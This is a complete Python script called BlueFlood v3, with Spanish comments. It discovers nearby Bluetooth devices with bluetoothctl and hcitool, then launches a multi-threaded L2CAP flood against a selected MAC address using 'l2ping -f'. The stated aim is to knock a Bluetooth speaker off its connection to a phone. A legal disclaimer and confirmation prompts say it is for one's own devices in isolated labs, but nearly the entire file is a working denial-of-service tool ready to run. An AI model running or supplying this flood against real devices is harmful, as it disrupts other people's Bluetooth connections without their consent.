#!/usr/bin/env python3
"""
blueflood_v3.py - BlueFlood con descubrimiento usando BlueZ v5.x moderno
Compatible con sistemas Linux actuales (Ubuntu 20.04+)
"""

import subprocess
import argparse
import time
import threading
import sys
import os
import re
import signal

def check_dependencies():
    """Verifica herramientas necesarias (modernas)"""
    missing = []
    for cmd in ['l2ping', 'bluetoothctl', 'hciconfig']:
        if subprocess.call(['which', cmd], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
            missing.append(cmd)
    if missing:
        print(f"[!] Faltan: {', '.join(missing)}")
        print("[*] Instala con: sudo apt install bluez bluez-utils")
        sys.exit(1)
    
    # Verificar que el adaptador está operativo
    result = subprocess.run(['hciconfig'], capture_output=True, text=True)
    if 'RUNNING' not in result.stdout:
        print("[!] El adaptador Bluetooth no está RUNNING.")
        print("[*] Ejecuta: sudo hciconfig hci0 up")
        sys.exit(1)
    
    print("[+] Dependencias OK. Adaptador Bluetooth operativo.")

def show_disclaimer():
    """Aviso de uso responsable"""
    os.system('clear')
    print("=" * 60)
    print("  BlueFlood v3 - Auditoría Bluetooth (BlueZ v5 Moderno)")
    print("=" * 60)
    print("\n[!] ADVERTENCIA LEGAL:")
    print("    Solo usar contra DISPOSITIVOS PROPIOS")
    print("    en ENTORNOS AISLADOS de laboratorio.")
    print("=" * 60)
    response = input("\n¿Confirmas? (s/n): ")
    if response.lower() != 's':
        print("[*] Cancelado.")
        sys.exit(0)
    os.system('clear')

def scan_with_bluetoothctl(duration=15):
    """
    Escaneo usando bluetoothctl (herramienta moderna de BlueZ v5).
    Este método SÍ funciona con el stack actual.
    """
    print(f"[*] Escaneando con bluetoothctl ({duration}s)...")
    print("    Este es el mismo método que usa el panel gráfico.\n")
    
    devices = {}
    
    try:
        # Iniciar bluetoothctl en modo escaneo
        proc = subprocess.Popen(
            ['bluetoothctl', 'scan', 'on'],
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True
        )
        
        # Leer salida durante el tiempo especificado
        start_time = time.time()
        while time.time() - start_time < duration:
            line = proc.stdout.readline()
            if not line:
                break
            
            # Procesar líneas que contienen dispositivos
            # Formato: [NEW] Device AA:BB:CC:DD:EE:FF Nombre del dispositivo
            if 'Device' in line and ('NEW' in line or 'CHG' in line):
                parts = line.strip().split('Device ')[-1]
                mac = parts[:17].strip().upper()
                name = parts[17:].strip() if len(parts) > 17 else '(sin nombre)'
                
                if re.match(r'^[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}$', mac):
                    devices[mac] = {'name': name, 'method': 'bluetoothctl'}
                    print(f"    [NUEVO] {mac} - {name}")
        
        proc.terminate()
        
    except Exception as e:
        print(f"[!] Error en escaneo: {e}")
    finally:
        # Asegurarse de detener el escaneo
        subprocess.run(['bluetoothctl', 'scan', 'off'], 
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    return devices

def discover_all_devices():
    """Fase de descubrimiento usando métodos compatibles con BlueZ v5"""
    print("=" * 60)
    print("  FASE 1: DESCUBRIMIENTO DE DISPOSITIVOS")
    print("=" * 60 + "\n")
    
    all_devices = {}
    
    # Método 1: bluetoothctl (el fiable, equivalente al panel gráfico)
    print("[1/2] Escaneo con bluetoothctl (método moderno)...")
    btctl_devices = scan_with_bluetoothctl(duration=15)
    for mac, info in btctl_devices.items():
        all_devices[mac] = info
    print(f"       Encontrados: {len(btctl_devices)} dispositivos\n")
    
    # Método 2: hcitool lescan como respaldo para BLE
    print("[2/2] Escaneo BLE adicional con hcitool...")
    try:
        result = subprocess.run(
            ['sudo', 'hcitool', 'lescan', '--duration=8'],
            timeout=12,
            capture_output=True,
            text=True
        )
        for line in result.stdout.split('\n'):
            if 'unknown' not in line and len(line.strip()) > 18:
                parts = line.strip().split()
                if len(parts) >= 1:
                    mac_candidate = parts[0].upper()
                    if re.match(r'^[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}$', mac_candidate):
                        if mac_candidate not in all_devices:
                            name = ' '.join(parts[1:]) if len(parts) > 1 else '(BLE device)'
                            all_devices[mac_candidate] = {'name': name, 'method': 'BLE scan'}
        print(f"       Encontrados adicionales: {len(all_devices) - len(btctl_devices)} dispositivos")
    except subprocess.TimeoutExpired:
        print("       Escaneo BLE completado por timeout")
    except Exception as e:
        print(f"       [!] Error en BLE scan: {e}")
    
    return all_devices

def l2ping_flood(mac, packet_size=600):
    """Hilo de inundación L2CAP"""
    cmd = ['l2ping', '-s', str(packet_size), '-f', mac]
    while True:
        try:
            subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
        except (subprocess.TimeoutExpired, Exception):
            pass

def launch_attack(mac, threads=4, packet_size=600, duration=60):
    """Lanza ataque multifilar"""
    print("\n" + "=" * 60)
    print("  FASE 2: ATAQUE L2CAP")
    print("=" * 60)
    print(f"\n[!] INICIANDO INUNDACIÓN L2CAP")
    print(f"    Objetivo: {mac}")
    print(f"    Hilos: {threads}")
    print(f"    Tamaño de paquete: {packet_size} bytes")
    print(f"    Duración: {duration} segundos")
    print(f"\n    [*] El altavoz debería desconectarse del móvil...")
    print(f"    [*] Pulsa Ctrl+C para detener antes de tiempo.\n")
    
    for i in range(threads):
        t = threading.Thread(target=l2ping_flood, args=(mac, packet_size), daemon=True)
        t.start()
        print(f"    [+] Hilo de ataque {i+1} lanzado")
    
    start_time = time.time()
    try:
        while time.time() - start_time < duration:
            time.sleep(1)
            elapsed = int(time.time() - start_time)
            if elapsed % 10 == 0:
                print(f"    [*] Ataque en curso... {elapsed}s / {duration}s")
    except KeyboardInterrupt:
        print("\n[!] Ataque detenido manualmente.")
    finally:
        print(f"\n[*] Ataque finalizado. Tiempo total: {int(time.time() - start_time)}s")
        print("[*] Comprueba si el altavoz se ha desconectado del móvil.\n")

def main():
    parser = argparse.ArgumentParser(
        description='BlueFlood v3 - Ataque L2CAP con BlueZ moderno',
        epilog='Ejemplo: sudo python3 blueflood_v3.py'
    )
    parser.add_argument('--mac', '-m', help='Dirección MAC del objetivo (si la conoces)')
    parser.add_argument('--threads', '-t', type=int, default=4, help='Número de hilos de ataque')
    parser.add_argument('--size', '-s', type=int, default=600, help='Tamaño del paquete L2CAP')
    parser.add_argument('--duration', '-d', type=int, default=60, help='Duración del ataque (segundos)')
    parser.add_argument('--discover-only', action='store_true', help='Solo descubrir, sin atacar')

    args = parser.parse_args()
    
    show_disclaimer()
    check_dependencies()
    
    if os.geteuid() != 0:
        print("[!] Necesitas permisos de superusuario:")
        print("    sudo python3 blueflood_v3.py")
        sys.exit(1)
    
    if args.mac:
        target_mac = args.mac.upper()
        print(f"[*] MAC proporcionada directamente: {target_mac}")
    else:
        devices = discover_all_devices()
        
        if not devices:
            print("\n" + "=" * 60)
            print("  [!] No se encontraron dispositivos.")
            print("=" * 60)
            print("\n  Posibles causas y soluciones:")
            print("  1. Bluetooth del portátil desactivado")
            print("     -> sudo rfkill unblock bluetooth")
            print("     -> sudo hciconfig hci0 up")
            print("  2. Altavoz apagado o sin batería")
            print("  3. Altavoz en modo pairing? Debe estar encendido y cerca")
            print("  4. Interferencias WiFi 2.4GHz")
            print("     -> Apaga el WiFi temporalmente:")
            print("        sudo nmcli radio wifi off")
            sys.exit(1)
        
        print("\n" + "=" * 60)
        print("  DISPOSITIVOS ENCONTRADOS:")
        print("=" * 60)
        device_list = list(devices.items())
        for i, (mac, info) in enumerate(device_list):
            print(f"  {i+1}. {mac} - {info['name']} [{info['method']}]")
        
        if args.discover_only:
            print("\n[*] Modo solo descubrimiento. Saliendo sin atacar.")
            sys.exit(0)
        
        try:
            choice = int(input("\nSelecciona el número del ALTAVOZ objetivo: ")) - 1
            target_mac = device_list[choice][0]
        except (ValueError, IndexError):
            print("[!] Selección inválida.")
            sys.exit(1)
    
    # Confirmación final
    print(f"\n[!] ATENCIÓN: Se lanzará un ataque DoS contra {target_mac}")
    print("    Asegúrate de que es TU altavoz y estás en un entorno aislado.")
    confirm = input("    Escribe 'SI' en mayúsculas para confirmar: ")
    if confirm != 'SI':
        print("[*] Operación cancelada.")
        sys.exit(0)
    
    # Verificar conectividad antes de atacar
    print(f"\n[*] Verificando conectividad con {target_mac}...")
    try:
        subprocess.run(['l2ping', '-c', '1', target_mac], 
                      timeout=5, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("[+] Dispositivo responde. Iniciando ataque.")
    except:
        print("[!] El dispositivo no responde a L2CAP ping.")
        print("    Puede que necesites ejecutar:")
        print(f"    sudo l2ping -c 3 {target_mac}")
        print("    Si falla, comprueba que el altavoz está encendido y cerca.")
        cont = input("    ¿Continuar de todos modos? (si/no): ")
        if cont.lower() != 'si':
            sys.exit(0)
    
    launch_attack(target_mac, args.threads, args.size, args.duration)

if __name__ == '__main__':
    main()

